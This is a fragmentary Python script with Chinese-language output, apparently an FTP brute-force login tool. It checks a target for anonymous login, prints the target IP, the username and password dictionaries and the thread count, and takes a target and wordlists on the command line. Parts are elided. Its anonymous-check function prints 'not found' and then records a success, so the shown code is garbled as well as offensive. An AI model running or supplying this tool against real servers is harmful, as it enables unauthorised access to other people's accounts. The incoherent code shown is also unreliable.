...
import ftplib,os,optparse,threading

def CheckAnonymous(FTPserver):
    try:
        print('[-] 未发现匿名用户[anonymous],[anonymous]')
        ...
        resultFile.write("恭喜!!!用户名:{},密码: {}".format
                         ("anonymous", "anonymous"))
        resultFile.close()
        f.quit()
...
def FTPExploit(ip,usernameFile,passwordFile,threadNumber,ftpPort):
    print("============爆破信息============")
    print("IP地址:" + ip)
    print("用户名字典:" + usernameFile)
    print("密码字典:" + passwordFile)
    print("线程数:" + str(threadNumber))
    print("端口:" + ftpPort)
    print("=================================")
    # 先检查是否允许匿名用户登录
    CheckAnonymous(ip)
...
if __name__ == '__main__':
    ...
    print("#####################################\n")
    parser = optparse.OptionParser('例子：python %prog -i 127.0.0.1 -u ./username -p ./password -t 20 -P 21\n')
    ...
    try:
        FTPExploit(options.targetIP, options.userName, options.passWord,
